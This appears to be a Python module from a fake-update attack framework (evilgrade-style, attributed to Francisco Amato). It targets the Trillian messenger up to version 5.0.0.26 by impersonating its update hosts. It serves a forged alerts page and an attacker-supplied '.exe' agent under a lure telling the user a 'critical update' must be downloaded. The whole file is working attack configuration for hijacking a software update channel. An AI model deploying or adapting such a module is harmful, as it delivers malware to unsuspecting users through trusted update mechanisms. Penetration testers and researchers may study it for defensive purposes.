from modules import ModuleBase


class Trillian(ModuleBase):
    name = 'Trillian'
    version = '1.0'
    appver = '<= 5.0.0.26'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.ceruleanstudios.com|cerulean.cachenetworks.com|www.trillian.im)'
    options = {
        'description': {
            'val': 'This critical update fix internal vulnerability. Please download it now!',
            'desc': 'Description to be displayed during the update'
        },
        'version': {
            'val': "7.2.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd2': {
            'val': "rand_num(2) + '-' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{ 
            'path': '/alerts/alerts.php',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/trillian/alerts.php',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]
